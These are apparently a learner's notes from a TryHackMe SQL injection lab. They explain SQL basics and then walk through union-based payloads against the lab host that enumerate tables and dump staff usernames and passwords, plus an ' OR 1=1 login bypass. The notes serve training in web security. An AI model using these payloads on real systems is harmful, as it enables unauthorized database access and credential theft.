b bAttack on a web application database server that causes malicious queries to be executed.

A Database is a way of electronically **storing collections of data in an organised manner**, a database is controlled by a **DBMS**, which is an acronym for **Database Management System**.

DBMS fall into two camps, **Relational and Non-Rational**

![[Pasted image 20240503235128.png]]

**Tables** are made up of columns and rows, with each cell having the actual data, each column, better referred to as a **field** has a unique name per table.

When creating a column, you also set the type of data it will contain, integers, strings or dates.

Setting the data type also ensures that incorrect infromation **isn't stored**.

A **key** field has to be **unique for every row of data**.

A **relational database** stores information in tables, and often, the tables share information between them, the tables will often contain a column t hat has a **unique ID(primary key)**, which will then b e used in other tables to reference it.

**Non-relational databases**, sometimes called **NoSQL**, are any sort of database taht don't use tables, columns and rows to store data, MongoDB, Cassandra...

### SQL Commands

**SELECT**
Retrieves data from the database

```sql
SELECT * from users;
```

`SELECT` tells the database we want to retrieve some data, `*` tells the database we want to receive back all columns from the table(id, username, password)

```sql
SELECT username, password from users;
```

This will only return username and password.

```SQL
SELECT * from users LIMIT 1;
```

`LIMIT 1` forces the database to return only one row of data.

```SQL
SELECT * from users where username='admin';
```

This is how we can finely pick out the exact data we require by returning data that matches our specific clauses

```sql
SELECT * from users where username='admin' or username='jon';
```

This will only return the rows where the usernaem is either equal to **admin** or **jon**

```SQL
SELECT * from users where username='admin' and password='p4ssword';
```

This will only return the rows where the username is either equal to **admin** and the password is equal to **p4ssword**

Using the `like` clause allows you to **specify data** that isn't an exact match but insteat either starts, contains or ends with certain characters by choosing where to place the wildcard character respresented by a `%`

```SQL
SELECT * from users where username like 'a%';
```

This returns any rows with a username bewginning with a letter a

```SQL
SELECT * from users where username like '%n';
```

This returns any rows with a username ending with the letter n

```sql
SELECT * from users where username like '%mi%';
```

Returns any rows with a username containing the characters **mi** within them

### UNION

The `UNION` statement combines the results of two or more `SELECT` statements to retrieve data from either a single or multiple tables.

The rules to this query are that the `UNION` statement must retrieve t he same number of columns in each `SELECT` statement, the columns have to be of similar data type, and the column order has to be the same.

```SQL
SELECT name, address, city, postcode from customers UNION SELECT company, address, city, postcode from suppliers;
```

### INSERT

Inserts a new row of data into the table

```SQL
INSERT into users (username, password) values ('bob', 'password123');
```

### UPDATE

Updates one or more rows of data within a table.

```SQL
UPDATE users SET username='root', password='pass123' where username='admin';
```

### DELETE

Straightforward, this will remove the entire row where **username = 'martin'**
```SQL
DELETE from users where username='martin';
```

```sql
DELETE from users
```

### In-Band SQL Injection

Refers to the same method of communication being used to exploit the vulnerability and also receive the results.

**Error-Based SQL Injection**
Most useful for easily obtaining information about the database structure, as error messages from the database are printed directly into the browser screen, user to **enumerate a whole database**

**Union-Based SQL Injection**
Utilises the `UNION` operator alongside a `SELECT` statement to return additional results to the page, most common way of extracting large amounts of data via an SQL Injection Vulnerability.


### Practical

The key to discovering err-rbased SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced.

For example, typing a `'` after the url

```
https://website.thm/article?id=1'
```

However if we try

``` 
https://website.thm/article?id=1 UNION SELECT 1
// SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns

https://website.thm/article?id=1 UNION SELECT 1, 2
// SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns

https://website.thm/article?id=1 UNION SELECT 1, 2, 3
// Expected behavior
```

The article is displayed because it takes the first resulted result somewhere in the website's code and shows that, to get around that, we need the first query to produce no results.

```
https://website.thm/article?id=0 UNION SELECT 1,2,3
```

Our next query will gather a list of tables that are in this database

```
https://website.thm/article?id=0 UNION SELECT 1,2, database()
```

The database is **sqli_one**

``` SQL
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

The `group_concat()` gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas.

`information_schema` database, every user has access to this, and it contains information about **all the databases and tables** the user has access to.

We're interested in listing all the tables in the **sqli_one** database, which is article and staff_users

```SQL
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

However the information we want to retrieve has changed from `table_name` to `column_name`
 the table we are querying in the information_schema database has changed from tables to columns.

```SQL
https://website.thm/article?id=0 UNION SELECT 1,2, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
```

We've added `':'` to split the username and password from each other.

### Blind SQLi

Blind SQLi is when we get **little to no feedback** to confirm our injected queries were, in fact, successful or not.

**Autentication Bypass**
Login forms that are connected to a database of users are often developed in such a way that the webapp isn't interested in the content , but more in whether the **two make a matching pair in the users table.**

**Practical**

We can see that the SQL query is this one

```sql
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

To make this into a query that always returns true, we can enter the following:

```sql
' OR 1=1;--
```

Which turns into this SQL statement

```sql
select * from users where username='' and password='' OR 1=1;
```

Because 1=1 is a **true statement** and we've used an OR operator, this will always cause the query to return as true.

### BLind SQLi - Boolean Based

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which is a boolean (successful or not)

``https://website.thm/checkuser?username=admin``

The browser body contains ``{"taken":true}``, this API endpoint replicates a common feature found on many signup forms, which **checks whether a username has already been registered to prompt the user to choose a different username**

```sql
select * from users where username = '%username%' LIMIT 1;
```


https://medium.com/@Aircon/sql-injection-tryhackme-thm-f712548fc198

